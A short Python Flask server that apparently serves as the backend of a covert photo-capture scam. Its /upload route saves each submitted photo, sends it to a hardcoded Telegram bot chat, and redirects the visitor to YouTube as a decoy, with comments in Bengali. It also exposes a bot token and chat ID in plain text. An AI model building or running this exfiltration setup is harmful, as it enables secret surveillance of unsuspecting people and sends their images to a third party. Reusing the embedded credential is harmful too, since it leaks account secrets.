from flask import Flask, request, redirect
import os
from datetime import datetime
import requests

app = Flask(__name__)

UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# 🔐 Telegram bot config
BOT_TOKEN = "7538296446:AAEN0sAqATn-f_RhRMOX1XZXiGEhh43gPP8"
CHAT_ID = "5657869656"

def send_photo_to_telegram(photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(photo_path, "rb") as photo:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": photo})

@app.route('/')
def home():
    return "Server is Running"

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' not in request.files:
        return "No photo uploaded", 400

    photo = request.files['photo']
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{UPLOAD_FOLDER}/image_{timestamp}.jpg"
    photo.save(filename)

    # ✅ Telegram এ পাঠাও
    send_photo_to_telegram(filename)

    # 🔄 Redirect করে মূল সাইটে ফেরত পাঠাও
    return redirect("https://www.youtube.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
